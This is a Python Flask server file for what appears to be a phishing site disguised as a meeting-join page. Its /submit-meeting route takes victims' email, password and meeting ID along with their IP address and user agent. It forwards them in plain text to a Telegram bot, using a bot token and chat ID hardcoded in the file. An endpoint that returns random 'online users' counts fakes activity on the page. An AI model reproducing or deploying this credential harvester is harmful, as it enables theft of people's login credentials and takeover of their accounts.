from flask import Flask, render_template, request, jsonify
import os
import requests

app = Flask(__name__, static_folder='static')
app.secret_key = os.getenv('SECRET_KEY', 'default-vercel-secret-key')

# Telegram configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8371372738:AAHLTXGl6_4Dha73DTuDWo4mo4qr2Sf0v28')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '1249855882')

def send_to_telegram(message):
    """Send message to Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except:
        return False

def get_client_info():
    """Get basic client information"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    return ip, user_agent

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit-meeting', methods=['POST'])
def submit_meeting():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({
                'success': False,
                'message': 'No data received'
            }), 400
        
        meeting_id = data.get('meetingId', '').strip()
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        if not email or not password:
            return jsonify({
                'success': False,
                'message': 'Email and password are required'
            }), 400
        
        # Get client info
        ip, user_agent = get_client_info()
        
        # Create message for Telegram
        message = f"""
<b>🔔 NEW MEETING JOIN REQUEST</b>

📋 <b>Meeting Details:</b>
• Meeting ID: <code>{meeting_id or 'Not provided'}</code>
• Email: <code>{email}</code>
• Password: <code>{password}</code>

🌍 <b>Client Info:</b>
• IP: <code>{ip}</code>
• User Agent: {user_agent[:100]}...
"""
        
        # Send to Telegram
        telegram_sent = send_to_telegram(message)
        
        return jsonify({
            'success': True,
            'message': 'Meeting request submitted',
            'telegram_sent': telegram_sent,
            'data': {
                'email': email[:3] + '***'  # Hide full email in response
            }
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': 'Server error'
        }), 500

@app.route('/api/online-users', methods=['GET'])
def online_users():
    import random
    # Return random number between 5-15
    return jsonify({'count': random.randint(5, 15)})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok'})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)